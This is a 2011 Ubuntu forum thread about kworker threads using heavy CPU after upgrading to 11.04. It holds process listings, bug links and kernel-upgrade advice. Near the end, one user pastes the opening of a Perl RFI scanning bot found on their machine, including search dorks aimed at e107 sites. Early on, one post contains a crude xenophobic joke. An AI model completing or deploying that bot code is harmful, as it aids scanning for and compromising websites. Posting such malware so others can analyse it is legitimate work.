kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
sh                     root     pts/2      0.00 secs Tue Apr 19 04:19
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
sh                     root     pts/2      0.00 secs Tue Apr 19 04:18
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
sh                     root     pts/2      0.00 secs Tue Apr 19 04:18
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
sh                     root     pts/2      0.00 secs Tue Apr 19 04:18
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:18
modprobe               root     __         0.00 secs Tue Apr 19 04:18
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
xrandr           S     root     pts/2      0.00 secs Tue Apr 19 04:17
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:17
modprobe               root     __         0.00 secs Tue Apr 19 04:17
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:17
modprobe               root     __         0.00 secs Tue Apr 19 04:17
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:17
modprobe               root     __         0.00 secs Tue Apr 19 04:17
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:17
modprobe               root     __         0.00 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:17
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:17
modprobe               root     __         0.00 secs Tue Apr 19 04:17
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:17
modprobe               root     __         0.00 secs Tue Apr 19 04:17
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:17
modprobe               root     __         0.00 secs Tue Apr 19 04:17
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:17
modprobe               root     __         0.00 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
iwpriv                 root     pts/2      0.00 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.03 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.04 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
lspci                  root     pts/2      0.06 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
modprobe               root     pts/2      0.00 secs Tue Apr 19 04:17
apt-check              goscuter __         0.45 secs Tue Apr 19 04:17
sh                     goscuter __         0.00 secs Tue Apr 19 04:17
dpkg                   goscuter __         0.00 secs Tue Apr 19 04:17
sh                     goscuter __         0.00 secs Tue Apr 19 04:17
dpkg                   goscuter __         0.00 secs Tue Apr 19 04:17
sh                     goscuter __         0.00 secs Tue Apr 19 04:17
dpkg                   goscuter __         0.00 secs Tue Apr 19 04:17
sh                     goscuter __         0.00 secs Tue Apr 19 04:17
dpkg                   goscuter __         0.00 secs Tue Apr 19 04:17
lsb_release            goscuter __         0.02 secs Tue Apr 19 04:17
sudo             S     root     pts/2      0.00 secs Tue Apr 19 04:17
apt-get          S     root     pts/2      0.34 secs Tue Apr 19 04:17
apt-get           F    root     pts/2      0.00 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
touch                  root     pts/2      0.00 secs Tue Apr 19 04:17
dpkg             S     root     pts/0      0.07 secs Tue Apr 19 04:17
dpkg             S     root     pts/0      0.25 secs Tue Apr 19 04:17
frontend               root     pts/0      0.16 secs Tue Apr 19 04:17
man-db.postinst        root     pts/0      0.00 secs Tue Apr 19 04:17
mandb            S     man      pts/0      0.04 secs Tue Apr 19 04:17
mandb             F    man      pts/0      0.00 secs Tue Apr 19 04:17
mandb             F    man      pts/0      0.00 secs Tue Apr 19 04:17
mandb             F    man      pts/0      0.00 secs Tue Apr 19 04:17
mandb             F    man      pts/0      0.00 secs Tue Apr 19 04:17
man-db.config          root     pts/0      0.00 secs Tue Apr 19 04:17
sh                     root     pts/0      0.00 secs Tue Apr 19 04:17
stty                   root     pts/0      0.00 secs Tue Apr 19 04:17
sh                     root     pts/0      0.00 secs Tue Apr 19 04:17
stty                   root     pts/0      0.00 secs Tue Apr 19 04:17
locale                 root     pts/0      0.00 secs Tue Apr 19 04:17
rm                     root     pts/0      0.00 secs Tue Apr 19 04:17
dpkg-deb               root     pts/0      0.00 secs Tue Apr 19 04:17
dpkg-deb          F    root     pts/0      0.00 secs Tue Apr 19 04:17
dpkg-deb          F    root     pts/0      0.00 secs Tue Apr 19 04:17
dpkg-deb               root     pts/0      0.00 secs Tue Apr 19 04:17
tar                    root     pts/0      0.00 secs Tue Apr 19 04:17
dpkg-deb          F    root     pts/0      0.00 secs Tue Apr 19 04:17
dpkg-deb          F    root     pts/0      0.00 secs Tue Apr 19 04:17
dpkg-split             root     pts/0      0.00 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
dpkg-preconfigu  S     root     pts/2      0.13 secs Tue Apr 19 04:17
dpkg-preconfigu   F    root     pts/2      0.00 secs Tue Apr 19 04:17
apt-extracttemp        root     pts/2      0.01 secs Tue Apr 19 04:17
gzip                   root     pts/2      0.00 secs Tue Apr 19 04:17
sh               S     root     pts/2      0.00 secs Tue Apr 19 04:17
dpkg             S     root     pts/2      0.00 secs Tue Apr 19 04:17
sh               S     root     pts/2      0.00 secs Tue Apr 19 04:17
dpkg             S     root     pts/2      0.00 secs Tue Apr 19 04:17
sh               S     root     pts/2      0.00 secs Tue Apr 19 04:17
dpkg             S     root     pts/2      0.00 secs Tue Apr 19 04:17
sh               S     root     pts/2      0.00 secs Tue Apr 19 04:17
stty                   root     pts/2      0.00 secs Tue Apr 19 04:17
sh               S     root     pts/2      0.00 secs Tue Apr 19 04:17
stty                   root     pts/2      0.00 secs Tue Apr 19 04:17
locale                 root     pts/2      0.00 secs Tue Apr 19 04:17
http                   root     pts/2      0.00 secs Tue Apr 19 04:17
http                   root     pts/2      0.00 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
dpkg             S     root     pts/2      0.00 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
dpkg             S     root     pts/2      0.00 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
dpkg             S     root     pts/2      0.00 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
dpkg             S     root     pts/2      0.00 secs Tue Apr 19 04:17
sh                     root     pts/2      0.00 secs Tue Apr 19 04:17
dpkg             S     root     pts/2      0.00 secs Tue Apr 19 04:17
kworker/0:3       F    root     __         0.00 secs Tue Apr 19 04:07
bash              F    goscuter pts/2      0.00 secs Tue Apr 19 04:17
python                 goscuter pts/2      0.13 secs Tue Apr 19 04:17
sudo             S     root     pts/2      0.00 secs Tue Apr 19 04:17
bash              F    goscuter pts/2      0.00 secs Tue Apr 19 04:17
python                 goscuter pts/2      0.14 secs Tue Apr 19 04:17
cron             SF    root     __         0.00 secs Tue Apr 19 04:17
sh               S     root     __         0.00 secs Tue Apr 19 04:17
run-parts              root     __         0.00 secs Tue Apr 19 04:17

```Pretty hard workers. Ten minutes of solid output, top effort k-team!

Not sure why they're using my terminal, and not even sure why I'm using my terminal. At least, I don't think I typed out hardly any of those commands. I'm pretty drunk but it's only 10 minutes...I don't really understand the timing order though. Perhaps my kworkers are back from the future. Nice of them to modify my kernel for me, I wasn't even planning on doing it - but I'm sure it was a job that had to be done, surely. 

Mine work all the time. They never stop. They just go go..and go. I'm kinda proud of them, just quietly. 

```
goscuter1@j-d:~$ ps aux | grep kworker
root        43  0.0  0.0      0     0 ?        S    01:14   0:00 [kworker/1:1]
root        44  0.0  0.0      0     0 ?        S    01:14   0:01 [kworker/2:1]
root        46  0.0  0.0      0     0 ?        S    01:14   0:06 [kworker/4:1]
root        67  0.0  0.0      0     0 ?        S    01:14   0:00 [kworker/u:3]
root        68  0.0  0.0      0     0 ?        S    01:14   0:00 [kworker/u:4]
root       143  0.0  0.0      0     0 ?        S    01:14   0:02 [kworker/1:2]
root      1850  0.0  0.0      0     0 ?        S    01:15   0:06 [kworker/4:2]
root     27892  0.0  0.0      0     0 ?        S    01:48   0:00 [kworker/2:0]
root     27965  0.0  0.0      0     0 ?        S    01:52   0:00 [kworker/5:1]
root     28045  0.0  0.0      0     0 ?        S    02:06   0:00 [kworker/5:0]
root     28086  0.0  0.0      0     0 ?        S    02:37   0:00 [kworker/3:2]
root     28089  0.0  0.0      0     0 ?        S    02:38   0:00 [kworker/6:2]
root     28253  0.0  0.0      0     0 ?        S    03:12   0:06 [kworker/0:1]
root     28697  0.0  0.0      0     0 ?        S    03:49   0:00 [kworker/7:1]
root     29058  0.0  0.0      0     0 ?        S    04:09   0:00 [kworker/6:0]
root     29662  0.1  0.0      0     0 ?        S    04:27   0:02 [kworker/0:3]
root     29665  0.0  0.0      0     0 ?        S    04:27   0:00 [kworker/7:2]
root     29768  0.0  0.0      0     0 ?        S    04:46   0:00 [kworker/3:0]
root     29798  0.0  0.0      0     0 ?        S    04:57   0:00 [kworker/4:3]
root     29814  0.0  0.0      0     0 ?        S    05:02   0:00 [kworker/0:0]
root     29815  0.0  0.0      0     0 ?        S    05:03   0:00 [kworker/4:0]
root     29823  0.0  0.0      0     0 ?        S    05:07   0:00 [kworker/0:2]
1000     29825  0.0  0.0   4160   860 pts/2    S+   05:08   0:00 grep --color=auto kworker

~$ uname -a
Linux j-d 2.6.38-8-generic-pae #42-Ubuntu SMP Mon Apr 11 05:17:09 UTC 2011 i686 i686 i386 GNU/Linux

~$ grep MHz /proc/cpuinfo
cpu MHz        : 1600.000
cpu MHz        : 1600.000
cpu MHz        : 1600.000
cpu MHz        : 1600.000
cpu MHz        : 1600.000
cpu MHz        : 1600.000
cpu MHz        : 1600.000
cpu MHz        : 1600.000

```Powertop seems kinda cool. Wish I understood it. I won't bother you with the questions, as I have pretty big questions about literally every single entry, starting with why all these things I'm not even doing are hassling poor old idle. Obviously I recognise Firefox as a program I use to interact with the outside world, and one or two others I am cordial with, or at least we've been formally introduced - but some of those are just strangers. Never met them in my life, can't say I have any desire to. Xorg especially, I am racist against anything Virtual. Filthy virtual immigrants, taking the jobs off hardworking logical patriots, stealing their women. bah

My kworkers are on crack. 

[QUOTE="Powertop"]Suggestion: increase the VM dirty writeback time from 5.00 to 15 seconds with:
  echo 1500 > /proc/sys/vm/dirty_writeback_centisecs
This wakes the disk up less frequently for background VM activity[/QUOTE]

Thanks Powertop! Wish you could tell me why there is any background VM activity...at ALL. 

Lucky I got flush-8:0 making sure my lazy hard disk doesn't slack off on the job. Not sure what it is though, and sick of Googling as that creates more questions than answers (like kworker just did), but I'm sure everything is as it should be. My kworkers will keep it all sorted and kicking along...

```
     PowerTOP version 1.13      (C) 2007 Intel Corporation

Cn                Avg residency       P-states (frequencies)
C0 (cpu running)        ( 2.7%)       Turbo Mode     5.1%
polling           6.1ms ( 0.0%)         2.54 Ghz     0.0%
C1 mwait          0.1ms ( 0.0%)         2.14 Ghz     0.0%
C2 mwait          1.0ms ( 3.9%)         2.00 Ghz     0.0%
C3 mwait          5.5ms (93.4%)         1.60 Ghz    94.8%

Wakeups-from-idle per second : 213.1    interval: 20.0s
no ACPI power usage estimate available

Top causes for wakeups:
  20.1% (101.2)   plugin-containe
  16.5% ( 83.2)   firefox-bin
  11.9% ( 60.0)   [fglrx[0]@PCI:2:0:0] <interrupt>
  10.6% ( 53.5)   kworker/0:1
   7.6% ( 38.5)   compiz
   6.1% ( 30.6)   [kernel scheduler] Load balancing tick
   4.8% ( 24.2)   soffice.bin
   3.9% ( 19.8)   desktopcouch-se
   2.3% ( 11.4)   kworker/0:0
   2.0% (  9.9)   ubuntuone-syncd
   1.8% (  9.0)   USB device  2-2 : DataTraveler 120 (Kingston)
   1.7% (  8.5)   [ehci_hcd:usb2, uhci_hcd:usb6] <interrupt>
   1.6% (  8.1)   [kernel core] usb_hcd_poll_rh_status (rh_timer_func)
   1.6% (  8.0)   USB device  7-2 : 2.4GHz Wireless Mouse (Dexin Corp.)
   0.0% (  0.2)D  flush-8:0
   1.3% (  6.7)   [ata_piix, ata_piix] <interrupt>
   1.2% (  5.8)   docky
   1.0% (  5.0)   [uhci_hcd:usb5, uhci_hcd:usb7, firewire_ohci] <interrupt>
   0.9% (  4.6)   [eth0] <interrupt>
   0.7% (  3.6)   [kernel core] hrtimer_start (tick_sched_timer)
   0.7% (  3.6)   nautilus
   0.1% (  0.7)D  beam.smp
   0.3% (  1.3)   gedit
   0.2% (  0.9)   gnome-settings-
   0.2% (  0.9)   shutter
   0.1% (  0.7)   unity-files-dae
   0.1% (  0.5)   udisks-daemon
   0.1% (  0.4)   indicator-weath
   0.1% (  0.3)   Xorg
   0.1% (  0.3)   gnome-terminal
   0.0% (  0.2)   unity-applicati

The program 'flush-8:0' is writing to file 'ECRYPTFS_FNEK_ENCRYPTED.FXaefvH' on
/dev/sda1.
This prevents the disk from going to powersave mode.

```

Keep up the good work, K-Team! =D>

---

### Post by magum on 2011-05-05
Hey I would like to join the circle. Slowly kworker seems to eat up all my ressources. In disturbs mouse movement and the music...

In case it really has something to do with the usb port I should mention that I am using an usb-stick for 3G internet connection. Weird enough: Before the update to 11.04 I didn't experience this problem...

top | grep kworker:

```
 
PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND    

2785 root      20   0     0    0    0 R   41  0.0   0:59.89 kworker/u:0                                                                                                           
2571 root      20   0     0    0    0 S    0  0.0   0:12.92 kworker/1:0                                                                                                           
2785 root      20   0     0    0    0 R   87  0.0   1:02.50 kworker/u:0                                                                                                           
2420 root      20   0     0    0    0 R   14  0.0   0:18.13 kworker/0:3                                                                                                           
2785 root      20   0     0    0    0 R   71  0.0   1:04.64 kworker/u:0                                                                                                           
2420 root      20   0     0    0    0 R   29  0.0   0:19.00 kworker/0:3                                                                                                           
2784 root      20   0     0    0    0 D    0  0.0   0:00.02 kworker/1:1                                                                                                           
2785 root      20   0     0    0    0 S    9  0.0   1:04.91 kworker/u:0                                                                                                           
2420 root      20   0     0    0    0 S    4  0.0   0:19.12 kworker/0:3                                                                                                           
2843 root      20   0     0    0    0 R   12  0.0   0:00.36 kworker/u:2                                                                                                           
2843 root      20   0     0    0    0 R   67  0.0   0:02.38 kworker/u:2                                                                                                           
2795 root      20   0     0    0    0 S   14  0.0   0:07.60 kworker/0:0                                                                                                           
2784 root      20   0     0    0    0 S    4  0.0   0:00.14 kworker/1:1                                                                                                           
2843 root      20   0     0    0    0 R   86  0.0   0:04.98 kworker/u:2                                                                                                           
2784 root      20   0     0    0    0 S    8  0.0   0:00.38 kworker/1:1                                                                                                           
2795 root      20   0     0    0    0 S    0  0.0   0:07.61 kworker/0:0                                                                                                           
2843 root      20   0     0    0    0 S   31  0.0   0:05.93 kworker/u:2                                                                                                           
2784 root      20   0     0    0    0 S   12  0.0   0:00.75 kworker/1:1                                                                                                           
2843 root      20   0     0    0    0 R   82  0.0   0:08.40 kworker/u:2                                                                                                           
2784 root      20   0     0    0    0 S    2  0.0   0:00.80 kworker/1:1                                                                                                           
2420 root      20   0     0    0    0 S    0  0.0   0:19.13 kworker/0:3                                                                                                           
2843 root      20   0     0    0    0 R   85  0.0   0:10.96 kworker/u:2                                                                                                           
2784 root      20   0     0    0    0 S    4  0.0   0:00.92 kworker/1:1                                                                                                           
2843 root      20   0     0    0    0 S   61  0.0   0:12.79 kworker/u:2                                                                                                           
2420 root      20   0     0    0    0 S    0  0.0   0:19.14 kworker/0:3 
```Even my firefox seems to loose against the mysterious kworker...

And there goes my keyboard...

---

### Post by oldmankit on 2011-05-12
My kworkers, or kninjas as I now call them, also have been going crazy since I upgraded to Natty.  

Is it me or does my battery last shorter now?

---

### Post by Okioki on 2011-05-16
Have the same problem. Samsung r528. Someone found a solution? It is impossible to use the system.

---

### Post by LostInBrittany on 2011-05-17
My kworker is crazy too...

```
  
horacio@horacio-laptop:~$ top | grep kworker
10 root      20   0     0    0    0 R  100  0.0  37:24.44 kworker/0:1        
 4613 root      20   0     0    0    0 S    0  0.0   0:00.14 kworker/1:2        
   10 root      20   0     0    0    0 R  100  0.0  37:27.45 kworker/0:1        
    4 root      20   0     0    0    0 S    0  0.0   0:00.09 kworker/0:0        
   10 root      20   0     0    0    0 R   99  0.0  37:30.43 kworker/0:1        
 2885 root      20   0     0    0    0 S    0  0.0   0:01.52 kworker/3:2        
   10 root      20   0     0    0    0 R  100  0.0  37:33.43 kworker/0:1        
 3985 root      20   0     0    0    0 S    0  0.0   0:01.63 kworker/2:2        
   10 root      20   0     0    0    0 R   99  0.0  37:36.42 kworker/0:1        
    4 root      20   0     0    0    0 S    0  0.0   0:00.09 kworker/0:0        
   10 root      20   0     0    0    0 R  100  0.0  37:39.42 kworker/0:1        
   10 root      20   0     0    0    0 R  100  0.0  37:42.42 kworker/0:1        
   10 root      20   0     0    0    0 R  100  0.0  37:45.43 kworker/0:1        
 3985 root      20   0     0    0    0 S    0  0.0   0:01.64 kworker/2:2        
    4 root      20   0     0    0    0 S    0  0.0   0:00.09 kworker/0:0        
   10 root      20   0     0    0    0 R   99  0.0  37:48.42 kworker/0:1        
 4613 root      20   0     0    0    0 S    0  0.0   0:00.15 kworker/1:2        
   10 root      20   0     0    0    0 R  100  0.0  37:51.42 kworker/0:1        
 2885 root      20   0     0    0    0 R    0  0.0   0:01.53 kworker/3:2        
   10 root      20   0     0    0    0 R  100  0.0  37:54.43 kworker/0:1        
    4 root      20   0     0    0    0 S    0  0.0   0:00.09 kworker/0:0  


horacio@horacio-laptop:~$ ps aux | grep kworker
root         4  0.0  0.0      0     0 ?        S    08:22   0:00 [kworker/0:0]
root        10 99.6  0.0      0     0 ?        R    08:22  53:36 [kworker/0:1]
root        47  0.0  0.0      0     0 ?        S    08:22   0:00 [kworker/0:2]
root       245  0.0  0.0      0     0 ?        S    08:22   0:00 [kworker/u:5]
root       246  0.0  0.0      0     0 ?        S    08:22   0:00 [kworker/u:6]
root      2885  0.0  0.0      0     0 ?        S    08:28   0:02 [kworker/3:2]
root      3985  0.0  0.0      0     0 ?        S    08:31   0:02 [kworker/2:2]
root      4683  0.0  0.0      0     0 ?        S    08:57   0:00 [kworker/2:1]
root      4686  0.0  0.0      0     0 ?        S    08:57   0:00 [kworker/3:0]
root      4700  0.0  0.0      0     0 ?        S    08:59   0:00 [kworker/1:1]
root      4711  0.0  0.0      0     0 ?        S    09:09   0:00 [kworker/1:2]
root      4753  0.0  0.0      0     0 ?        S    09:13   0:00 [kworker/3:1]
root      4756  0.0  0.0      0     0 ?        S    09:14   0:00 [kworker/2:0]
root      4757  0.0  0.0      0     0 ?        S    09:14   0:00 [kworker/1:0]
horacio   4787  0.0  0.0   4164   860 pts/0    S+   09:16   0:00 grep kworker
horacio@horacio-laptop:~$ uname -a
Linux horacio-laptop 2.6.38-9-generic-pae #43-Ubuntu SMP Thu Apr 28 17:12:11 UTC 2011 i686 i686 i386 GNU/Linux

```

My HP ProBook with its Core i5 processor and its 8 Gb RAM is running sluggish... :(

Nobody has any clue ?

---

### Post by arislaw on 2011-05-17
Same problem here. I am using a lenovo t400... this problem is make me thing about how the open source development works... I am sad about it... I did a lot of kernel upgrades... every time I hope this going to be fixed but it is not... 

pls!!! help here!!!

---

### Post by arislaw on 2011-05-17
same problem here... lenovo 1400

cannot use my laptop with this new kernel... help Ubuntu! help!

---

### Post by arislaw on 2011-05-17
I found this

[http://www.archivum.info/ubuntu-bugs@lists.ubuntu.com/2011-04/17233/%28Bug-755226%29-%28NEW%29-syndaemon-starts-eating-up-100-CPU-after-waking-laptop-from-sleep.html](http://www.archivum.info/ubuntu-bugs@lists.ubuntu.com/2011-04/17233/%28Bug-755226%29-%28NEW%29-syndaemon-starts-eating-up-100-CPU-after-waking-laptop-from-sleep.html)

and I removed this package... I don't know if that is the reason but it seems to work... 

I also tryed to boot with a old kernel version... it did not work but maybe it helped too ... i dont know...

this kind of bug make be sad about linux...

---

### Post by arislaw on 2011-05-19
no, it is not working... sorry... 

it seems to be related to how long I let the notebook running... ... what could I do Ubuntu!!!?

---

### Post by klausner on 2011-05-19
Given all those with the problem here, I'm going to astroturf the [entry at Launchpad]("https://bugs.launchpad.net/ubuntu/+source/linux/+bug/700335"). Maybe we can get some response there!

---

### Post by mdacova on 2011-05-25
Mine seems to stop if I plug the power in for a while and then remove 

anyway found this post seems its been around a while 

[https://lkml.org/lkml/2011/3/30/836](https://lkml.org/lkml/2011/3/30/836)

---

### Post by Bandit on 2011-05-26
I got this Kworker running on my desktop. Seems to be about 3 to 4 of them running. First glance I was wondering what a K apt was running for in Gnome.. lol

---

### Post by rockair on 2011-05-28
I upgraded to 2.6.39-0-generic #5~20110427-Ubuntu from Kernel PPA (Personal Package Archive) repository and kworker works fine on my HP EliteBook 8540w. There is no cpu load.
So try to add repository:
```
sudo add-apt-repository ppa:kernel-ppa/ppa
sudo apt-get update
```
and upgrade:
```
sudo apt-get install linux-headers-2.6.39-0 linux-headers-2.6.39-0-generic linux-image-2.6.39-0-generic --fix-missing
```.

Worked for me. :)

---

### Post by rssaddict on 2011-06-05
2.6.39-0 doesn't fix the problem for me. Still have high idle cpu usage seemingly caused by kworker processes. Anyone else have any ideas?

---

### Post by jorgebirck on 2011-06-08
Same here. Intel i3

---

### Post by rssaddict on 2011-06-08
This bug report seems to be the actual issue:

[https://bugs.launchpad.net/ubuntu/+source/linux/+bug/717919](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/717919)

---

### Post by olol85 on 2011-06-20
Installed linux mint a couple of days ago. Bundled kernel is:

Linux lamikawaite 2.6.32-5-amd64 #1 SMP Wed Jan 12 03:40:32 UTC 2011 x86_64 GNU/Linux

I of course did a dist-upgrade and ended with 2.6.38-2 which showed the issue. I went back to the older kernel and the problem is gone. No kworker process whatsoever.
I also noticed that with the newer kernel I would have very short (but annoying) mouse freezes.

---

### Post by perdlo on 2011-06-20
Just googled "kworker" it brought me here. Here is my issue with kworker:

I got the message "**Your Desktop Is being controlled by another user**" (same one you get when your VNC'ing into your machine.

A terminal window opened and did a wget of a file called **src.txt**!!!! (perl script - virus/malware).

I pulled network cable from my pc and rebooted.

Did a ps -ef > process_before.txt
ran the **src.txt** script
Did a ps -ef > process_after.txt

I compared the 2 file and the only differences were the kworker processes (about 8 of them). I couldn't kill them manually.

If I were you guys I would check for a file called src.txt in your home directory. I wondering if we are all having the same issue.


Any suggestions would also help especially if you have had the same problem. If anyone wants me to upload the src.txt just ask.

---

### Post by klausner on 2011-06-21
> **perdlo said:**
> If anyone wants me to upload the src.txt just ask.

Please upload it.

---

### Post by perdlo on 2011-06-23
Here is the contents of the file src.txt that I found in my home directory:

```

#!/usr/bin/perl
my $aboutbot='
################################
#  Origins RFI CRACK Bot v2.5  #
#  By Xmen Nov 2010.           #
#     Xcode@writeme.com        #
################################
';
print($aboutbot);
use strict;
use Socket;
use IO::Select;
use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use URI::Escape;
 
my @dorxzz = ("e107","contact e107","username: e107","e107 powered by e107","password: e107","contact details e107","contact us e107","e107 contact","contact.php e107");
my $dorxz  = $dorxzz[rand(scalar(@dorxzz))];

my $versi   = "SHG ScAnner GetPHPbot";
my @cmdpreZ = ("!");
my $cmdpre  = $cmdpreZ[rand(scalar(@cmdpreZ))];

##[ KONFIGURASI URL ]##
